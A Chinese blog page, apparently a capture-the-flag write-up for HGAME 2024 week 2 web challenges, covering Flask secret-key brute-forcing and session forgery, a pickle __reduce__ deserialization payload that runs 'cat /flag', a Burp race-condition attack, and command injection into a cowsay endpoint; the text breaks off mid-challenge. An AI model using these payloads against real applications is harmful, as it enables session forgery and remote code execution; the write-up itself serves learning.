@@ -1,0 +1,1124 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="s0k1y">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="HGAME week2 WEB myflask &#x2F;flag url   伪造session需要key currentDateAndTime &#x3D; datetime.now(timezone(‘Asia&#x2F;Shanghai’)) currentTime &#x3D; currentDateAndTime.strftime(“%H%M%S”) app &#x3D; Flask(name) # Tips: Try to cra">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HGAME_WEEK2">
+<meta property="og:url" content="https://s0k1y.github.io/2024/03/13/HGAME-WEEK2/index.html">
+<meta property="og:site_name" content="s0k1y&#39;s world">
+<meta property="og:description" content="HGAME week2 WEB myflask &#x2F;flag url   伪造session需要key currentDateAndTime &#x3D; datetime.now(timezone(‘Asia&#x2F;Shanghai’)) currentTime &#x3D; currentDateAndTime.strftime(“%H%M%S”) app &#x3D; Flask(name) # Tips: Try to cra">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240206122428958.png">
+<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240206122907789.png">
+<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240206152130272.png">
+<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240206153127516.png">
+<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240206153932824.png">
+<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240206155632035.png">
+<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240206160356756.png">
+<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240206160431085.png">
+<meta property="og:image" content="https://img2022.cnblogs.com/blog/1419450/202205/1419450-20220524151936632-1013284150.png">
+<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240206184505169.png">
+<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240206185041829.png">
+<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240206185356576.png">
+<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240205234513758.png">
+<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240205234622448.png">
+<meta property="og:image" content="https://image.3001.net/images/20230814/1692003286_64d9ebd6a01d37bcd3488.png">
+<meta property="og:image" content="https://image.3001.net/images/20230814/1692003311_64d9ebef9240f08bb444a.png">
+<meta property="og:image" content="https://image.3001.net/images/20230814/1692003323_64d9ebfb8cfb2e90a30c7.png">
+<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240205222930129.png">
+<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240205232844558.png">
+<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240205233344545.png">
+<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240206104655995.png">
+<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240206110012059.png">
+<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240206110356045.png">
+<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240206110530233.png">
+<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240206113842907.png">
+<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240206114848651.png">
+<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240206115729363.png">
+<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240206115827059.png">
+<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240206115955897.png">
+<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240206120037345.png">
+<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240206120911714.png">
+<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240206121032623.png">
+<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240206121445472.png">
+<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240206121516661.png">
+<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240206121554602.png">
+<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240206193639563.png">
+<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240206220250253.png">
+<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240206220414097.png">
+<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240206220458686.png">
+<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240206221705579.png">
+<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240206221924271.png">
+<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240206224145351.png">
+<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240206225249995.png">
+<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240206225527362.png">
+<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240206225624318.png">
+<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240206230137020.png">
+<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240206231002480.png">
+<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240205203307444.png">
+<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240205203759435.png">
+<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240205203916113.png">
+<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240205204039145.png">
+<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240205205118081.png">
+<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240205223214171.png">
+<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240205224506878.png">
+<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240205232055843.png">
+<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240205231735217.png">
+<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240207193003694.png">
+<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240206014519732.png">
+<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240206200945245.png">
+<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240207165748835.png">
+<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240207170044712.png">
+<meta property="og:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240207170418297.png">
+<meta property="article:published_time" content="2024-03-13T14:40:12.000Z">
+<meta property="article:modified_time" content="2024-03-13T14:43:12.606Z">
+<meta property="article:author" content="s0k1y">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="c:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240206122428958.png">
+  
+  
+  
+  <title>HGAME_WEEK2 - s0k1y&#39;s world</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"s0k1y.github.io","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Fluid</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="HGAME_WEEK2"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-03-13 22:40" pubdate>
+          2024年3月13日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          25k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          213 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">HGAME_WEEK2</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1>HGAME week2</h1>
+<h2 id="WEB">WEB</h2>
+<h6 id="myflask">myflask</h6>
+<p>/flag url</p>
+<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240206122428958.png" srcset="/img/loading.gif" lazyload alt="image-20240206122428958"></p>
+<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240206122907789.png" srcset="/img/loading.gif" lazyload alt="image-20240206122907789"></p>
+<p>伪造session需要key</p>
+<p>currentDateAndTime = datetime.now(timezone(‘Asia/Shanghai’))</p>
+<p>currentTime = currentDateAndTime.strftime(“%H%M%S”)</p>
+<p>app = Flask(<strong>name</strong>)</p>
+<p># Tips: Try to crack this first ↓</p>
+<p>app.config[‘SECRET_KEY’] = currentTime</p>
+<p>这段代码首先获取当前的时间（以亚洲/上海时区为准），然后将这个时间格式化为“小时分钟秒”的形式，并将这个值设置为 Flask 应用的 <code>SECRET_KEY</code></p>
+<p><code>SECRET_KEY</code> 的值在每次应用启动时都会改变，因为它依赖于当前的精确时间。但是，一旦应用启动并且这个密钥被设置，它就会在应用的整个运行周期内保持不变，直到下次重新启动应用。</p>
+<p>所以按靶机启动时间范围进行爆破</p>
+<p>session在加密时相同的key和相同的内容</p>
+<p>加密出的密文签名是不同的，因此不能通过爆破时间加密对比session来找出cookie</p>
+<p>而应该反其道行之</p>
+<p>爆破解密</p>
+<p>如果爆破不成功</p>
+<p>就会decoding error</p>
+<p>如果成功 就会找到相应的key</p>
+<p>import subprocess<br>
+from datetime import datetime, timedelta</p>
+<p>def generate_time_keys(start_time, end_time):<br>
+“”“生成给定时间范围内每一秒的时间字符串列表”“”<br>
+time_keys = []<br>
+current_time = start_time<br>
+while current_time &lt;= end_time:<br>
+time_keys.append(current_time.strftime(“%H%M%S”))<br>
+current_time += timedelta(seconds=1)<br>
+return time_keys</p>
+<p>start_time = datetime.strptime(“15:18:00”, “%H:%M:%S”)<br>
+end_time = datetime.strptime(“23:59:59”, “%H:%M:%S”)</p>
+<p>time_keys = generate_time_keys(start_time, end_time)</p>
+<p>for secret_key in time_keys:<br>
+print(secret_key)<br>
+command = f&quot;python3 /root/桌面/Sky/Skypython/flask-session/flask-session-cookie-manager-master/flask_session_cookie_manager3.py decode -s ‘{secret_key}’ -c ‘eyJ1c2VybmFtZSI6Imd1ZXN0In0.ZcHdVA.UtOYx3zKSlfqsaNQ3cf0lHTKX4c’ &quot;<br>
+result = subprocess.run(command, shell=True, capture_output=True, text=True)<br>
+print(result.stdout)<br>
+if “[Decoding error]” not in result.stdout:<br>
+print(f&quot;Found key: {secret_key}&quot;)<br>
+break<br>
+else:<br>
+print(“No valid key found.”)</p>
+<p>以上是py实现</p>
+<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240206152130272.png" srcset="/img/loading.gif" lazyload alt="image-20240206152130272"></p>
+<p>有了key</p>
+<p>我们对username是admin进行加密就可以得到admin的session</p>
+<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240206153127516.png" srcset="/img/loading.gif" lazyload alt="image-20240206153127516"></p>
+<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240206153932824.png" srcset="/img/loading.gif" lazyload alt="image-20240206153932824"></p>
+<p>​    pickle_data=base64.b64decode(request.form.get(‘pickle_data’))</p>
+<p>​    userdata=pickle.loads(pickle_data)</p>
+<p>pickle反序列化</p>
+<p>利用 <code>__reduce__</code> 构造恶意字符串，当这个字符串被反序列化的时候，<code>__reduce__</code>会被执行</p>
+<p>本地测试</p>
+<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240206155632035.png" srcset="/img/loading.gif" lazyload alt="image-20240206155632035"></p>
+<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240206160356756.png" srcset="/img/loading.gif" lazyload alt="image-20240206160356756"></p>
+<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240206160431085.png" srcset="/img/loading.gif" lazyload alt="image-20240206160431085"></p>
+<p><img src="https://img2022.cnblogs.com/blog/1419450/202205/1419450-20220524151936632-1013284150.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>我明白了，之前是陷入了误区，开了debug模式是没有回显的</p>
+<p>只能用类似报错注入的方法来获取回显</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> os<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Email</span>():<br>	email = <span class="hljs-string">&quot;admin@admin.com&quot;</span><br><br>	<span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>		<span class="hljs-keyword">return</span> (<span class="hljs-built_in">exec</span>,(<span class="hljs-string">&quot;raise Exception(__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read())&quot;</span>,))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>():	<br>	poc = base64.b64encode(pickle.dumps(Email()))<br>	<span class="hljs-built_in">print</span>(poc)<br><br>login()<br></code></pre></td></tr></table></figure>
+<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240206184505169.png" srcset="/img/loading.gif" lazyload alt="image-20240206184505169"></p>
+<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240206185041829.png" srcset="/img/loading.gif" lazyload alt="image-20240206185041829"></p>
+<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240206185356576.png" srcset="/img/loading.gif" lazyload alt="image-20240206185356576"></p>
+<h6 id="select-more-course">select more course</h6>
+<p>弱口令爆破</p>
+<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240205234513758.png" srcset="/img/loading.gif" lazyload alt="image-20240205234513758"></p>
+<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240205234622448.png" srcset="/img/loading.gif" lazyload alt="image-20240205234622448"></p>
+<p>这里题目给了一个提示</p>
+<p>race aginst time</p>
+<p>扫了一下没有源码泄露</p>
+<p>race，time</p>
+<p>条件竞争漏洞？</p>
+<p>在申请扩学分时是不是会先扩然后再执行一段判断是否满足扩学分条件的代码，如果可以就没事，不可以就取消操作</p>
+<p>那么就有操作空窗</p>
+<p>只要先扩，这时没等它执行完，就执行选课，那么这时一定能抢到</p>
+<p>条件竞争漏洞</p>
+<p>burp把两个操作分别抓50个包，去重放创建两个发包组合，send</p>
+<p>把这50个请求包放到一个请求包组<br>
+<img src="https://image.3001.net/images/20230814/1692003286_64d9ebd6a01d37bcd3488.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p><img src="https://image.3001.net/images/20230814/1692003311_64d9ebef9240f08bb444a.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p><img src="https://image.3001.net/images/20230814/1692003323_64d9ebfb8cfb2e90a30c7.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p>分别点一下两个包组</p>
+<p>刷新一下</p>
+<p>选上了</p>
+<p>hgame{5ak_p45sW0rD_&amp;_r4Ce_c0nDiT10n}</p>
+<h6 id="What-the-cow-say">What the cow say?</h6>
+<p>插件看了一下</p>
+<p>php后台 题目名flask</p>
+<p>考虑 SQL RCE</p>
+<p>和我之前遇到的figlet很像啊</p>
+<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240205222930129.png" srcset="/img/loading.gif" lazyload alt="image-20240205222930129"></p>
+<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240205232844558.png" srcset="/img/loading.gif" lazyload alt="image-20240205232844558"></p>
+<p>怀疑是RCE；</p>
+<p>;被过滤</p>
+<p>flag被过滤</p>
+<p>它的前端窗口就是终端吧?</p>
+<p>感觉它的后台逻辑和之前做过的diglet很像</p>
+<p>就是经过通道后直接接终端</p>
+<p>加了点过滤</p>
+<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240205233344545.png" srcset="/img/loading.gif" lazyload alt="image-20240205233344545"></p>
+<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240206104655995.png" srcset="/img/loading.gif" lazyload alt="image-20240206104655995"></p>
+<p>抓个包看看</p>
+<p>user_input，有点意思</p>
+<p>|被过滤</p>
+<p>先fuzz一下吧，看看过滤了什么</p>
+<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240206110012059.png" srcset="/img/loading.gif" lazyload alt="image-20240206110012059"></p>
+<p>???!!!</p>
+<p>RCE实锤</p>
+<p>输入/*输出</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">_________________________________________<br>/ <span class="hljs-string">/app</span> <span class="hljs-string">/bin</span> <span class="hljs-string">/boot</span> <span class="hljs-string">/dev</span> <span class="hljs-string">/etc</span> <span class="hljs-string">/flag_is_here</span> \<br>| <span class="hljs-string">/home</span> <span class="hljs-string">/lib</span> <span class="hljs-string">/lib64</span> <span class="hljs-string">/media</span> <span class="hljs-string">/mnt</span> <span class="hljs-string">/opt</span>      |<br>| <span class="hljs-string">/proc</span> <span class="hljs-string">/root</span> <span class="hljs-string">/run</span> <span class="hljs-string">/sbin</span> <span class="hljs-string">/srv</span> <span class="hljs-string">/sys</span> <span class="hljs-string">/tmp</span>   |<br>\ <span class="hljs-string">/usr</span> <span class="hljs-string">/var</span>                               /<br> <span class="hljs-params">-----------------------------------------</span><br></code></pre></td></tr></table></figure>
+<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240206110356045.png" srcset="/img/loading.gif" lazyload alt="image-20240206110356045"></p>
+<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240206110530233.png" srcset="/img/loading.gif" lazyload alt="image-20240206110530233"></p>
+<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240206113842907.png" srcset="/img/loading.gif" lazyload alt="image-20240206113842907"></p>
+<p>实锤了</p>
+<p>它压根连引号都不用绕</p>
+<p>就是user_input直接拼接到cowsay命令后</p>
+<p>linux terminal中输入cowsay -l</p>
+<p>会输出所有动物模板的名字</p>
+<p>\   ；  |  &amp;  cat</p>
+<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240206114848651.png" srcset="/img/loading.gif" lazyload alt="image-20240206114848651"></p>
+<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240206115729363.png" srcset="/img/loading.gif" lazyload alt="image-20240206115729363"></p>
+<p>本地起一个看看执行逻辑</p>
+<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240206115827059.png" srcset="/img/loading.gif" lazyload alt="image-20240206115827059"></p>
+<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240206115955897.png" srcset="/img/loading.gif" lazyload alt="image-20240206115955897"></p>
+<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240206120037345.png" srcset="/img/loading.gif" lazyload alt="image-20240206120037345"></p>
+<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240206120911714.png" srcset="/img/loading.gif" lazyload alt="image-20240206120911714"></p>
+<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240206121032623.png" srcset="/img/loading.gif" lazyload alt="image-20240206121032623"></p>
+<p>这里有一个小坑</p>
